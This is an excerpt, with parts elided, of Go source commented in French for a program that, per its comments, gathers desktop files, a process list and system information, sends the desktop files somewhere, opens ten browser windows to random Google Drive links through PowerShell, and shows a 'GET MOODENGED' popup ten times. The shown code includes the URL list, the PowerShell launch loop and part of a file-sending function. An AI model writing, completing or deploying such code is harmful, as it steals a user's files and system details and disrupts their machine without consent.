...
// dans `processlist.txt` et des informations système dans `sysinfo.txt`, ouvre aléatoirement
// des pages web depuis une liste d'URLs, et affiche une pop-up avec le message "GET MOODENGED" 10 fois en dernier.
...
// Liste d'URLs à ouvrir
var urls = []string{
    "https://drive.google.com/file/d/1H_3uSBnhrm0gSDb5oAi1jnIEc8qytbUK/view?usp=sharing",
    "https://drive.google.com/file/d/1OwtKrl7R24rSVPAfr1jILbFn2ACBzQk1/view?usp=sharing",
    "https://drive.google.com/file/d/1qXMIis7rtH4a1UO6TJgAtpIc0CurWUv3/view?usp=sharing",
    "https://drive.google.com/file/d/1qJSBu-ohmANs-D9WzOYgVpDz-kq5b_o5/view?usp=sharing",
    "https://drive.google.com/file/d/1foDRpWXkq2q2JuqDNJCgmOQjK1CEoIFA/view?usp=sharing",
}
...
func main() {
    ...
    // Ouvre 10 fenêtres de navigateur avec des URLs sélectionnées aléatoirement
    openRandomURLs()

    // Affiche la pop-up "GET MOODENGED" 10 fois à la fin de toutes les opérations
    showPopup()
}
...
func sendDesktopFiles(desktopPath string) {
    ...
    for _, file := range files {
        // Vérifie que l'élément est un fichier et respecte la limite de taille
...
// Fonction pour ouvrir 10 fenêtres de navigateur avec des URLs aléatoires
func openRandomURLs() {
    for i := 0; i < 10; i++ {
        randomURL := urls[rand.Intn(len(urls))]
        exec.Command("powershell", "-Command", "Start-Process", randomURL).Run()
    }
}
